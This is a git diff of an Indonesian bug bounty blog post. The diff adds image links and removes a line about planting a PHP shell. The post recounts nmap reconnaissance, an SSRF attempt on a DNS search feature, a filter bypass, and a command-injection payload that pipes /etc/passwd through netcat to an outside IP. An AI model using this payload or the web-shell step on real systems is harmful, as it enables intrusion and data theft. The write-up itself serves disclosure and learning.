@@ -17,7 +17,7 @@ Pada tahap reconnaissance,saya menggunakan nmap dengan perintah
 Disana terdapat beberapa port yang open, saya tertarik dengan port 8010. Pada saat tulisan ini dibuat saya coba scan lagi ternyata sudah filtered.
 
 <div align="center">
-    <img src="">
+    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/1.png?raw=true">
 </div>
 
 
@@ -34,7 +34,7 @@ Saya tertarik dengan fungsi search yg ada di menu dnsbse, disana ada form search
 - Script : https://pastebin.com/raw/zZN1pfSY
 
 <div align="center">
-    <img src="">
+    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/2.png?raw=true">
 </div>
 
 
@@ -46,7 +46,7 @@ Masih ingat menu dnsbse? Tadi yang kita bahas kalau fungsi dnsbse juga merequest
 Saya pikir ini bisa diexploitasi dengan SSRF (Server Side Request Forgery);
 
 <div align="center">
-    <img src="">
+    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/3.png?raw=true">
 </div>
 
 setelah mencoba beberapa payload SSRF, ternyata zonk wwkwkw `>_<` 
@@ -54,13 +54,11 @@ Saya sambil baca-baca referensi, akhirnya ketemu cara bypass stringnya hanya men
 
 Saya masukin request ke repeater di burp, lalu saya masukin payload `cat /etc/passwd | nc XXX.199.221.101 9091` pada parameter server, dan didapatkan result:
 <div align="center">
-    <img src="">
+    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/4.png?raw=true">
 </div>
-Lalu saya buat shell php dan eksekusi ls -lah, dan selebihnya saya dapat explorasi server lebih dalam:
 
-RIP SS :v 
 <div align="center">
-    <img src="">
+    <img src="https://github.com/zetc0de/zetc0de.github.io/blob/master/assets/images/BugBounty/netpurifier/5.png?raw=true">
 </div>
 
 
